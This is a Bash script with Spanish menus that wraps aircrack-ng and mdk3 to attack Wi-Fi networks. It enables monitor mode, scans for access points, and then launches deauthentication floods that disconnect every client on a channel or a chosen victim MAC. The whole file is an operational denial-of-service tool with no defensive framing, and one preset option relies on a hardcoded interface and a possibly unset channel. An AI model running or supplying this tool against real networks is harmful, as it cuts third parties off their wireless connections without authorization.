#!/bin/bash
#mdk3 [interfaz] d -w archivoconlasmac.txt -c 1 -s 250
clear;
br="n";
int="";
echo Modo Monitor? s-n
read usr;
if [ "$usr" = "s" ]; then
	sudo ifconfig;
	echo Ingrese interface:
	read int;
	sudo airmon-ng start $int;
	clear;
	sudo iwconfig;
fi
echo Ingrese interface Monitor:
read mon;

while [ "$br" = "n" ]; do
	clear;
	echo Script de Ataques DDOS a redes Wifi con MDK3 y Aircrack-ng;
	echo 
	echo 1-Escaneo general;
	echo 2-Escaneo especifico;
	echo 3-Ataque por canal;
	echo 4-Ataque por AP o Cliente;
	echo 5-Ataque Pre-establecido;
	echo 6-Detener modo Monitor;
	echo 7-Salir;

	echo
	echo Opción a procesar:
	read opt;

	if [ "$opt" = "1" ]; then
		sudo airodump-ng $mon;
		echo Enter para continuar...
		read 
	elif [ "$opt" = "2" ]; then
		echo MAC victima:
		read mc;
		echo Canal:
		read ch;
		sudo airodump-ng --bssid $mc -c $ch $mon;
		echo Enter para continuar...
		read
	elif [ "$opt" = "3" ]; then
		echo Canal:
		read ch;
		echo Efectuando ataque... Ctrl+C para cancelar
		sudo xterm -bg black -fg red -title Expulsando_clientes... -e sudo mdk3 $mon d -c $ch &
	elif [ "$opt" = "4" ]; then
		echo MAC victima:
		read mc;
		echo Canal:
		read ch;
		echo $mc >b.txt;
		echo Efectuando ataque... Ctrl+C para cancelar
		sudo xterm -bg black -fg red -title Expulsando_clientes... -e sudo mdk3 $mon d -c $ch -b b.txt &
	elif [ "$opt" = "5" ]; then
		echo Efectuando ataque... Ctrl+C para cancelar
		sudo xterm -bg black -fg red -title Expulsando_clientes... -e sudo mdk3 mon0 d -c $ch -b b.txt -s 250 &
	elif [ "$opt" = "6" ]; then
		sudo airmon-ng stop $mon
		br="s";
	else
		clear
		br="s";
	fi
done

